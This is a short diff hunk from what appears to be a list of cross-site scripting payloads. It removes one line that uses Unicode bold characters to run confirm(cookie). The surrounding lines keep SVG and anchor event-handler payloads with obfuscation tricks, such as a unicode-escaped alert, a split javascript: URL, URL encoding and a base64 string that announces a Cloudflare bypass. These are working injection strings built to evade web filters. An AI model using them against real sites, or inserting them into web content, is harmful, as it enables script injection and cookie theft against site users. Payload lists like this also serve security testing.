@@ -20,7 +20,6 @@ a onclick="alert(1)">XSS</a>
 <svg onload='new Function["Y000!"].find(al\u0065rt)'>
 <sVg OnPointerEnter="location=javas+cript:ale+rt%2+81%2+9;//</div">
 <Svg On Only=1 Onload=alert(1337)>
-"><𝘀𝘃𝗴+𝗼𝗻𝗹𝗼𝗮𝗱=𝗰𝗼𝗻𝗳𝗶𝗿𝗺(𝗰𝗼𝗼𝗸𝗶𝗲)>
 %3cSvg%20Only%3d1%20OnLoad%3dconfirm(1)%3e
 <Svg Only=1 OnLoad=confirm(document.domain)>
 <Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
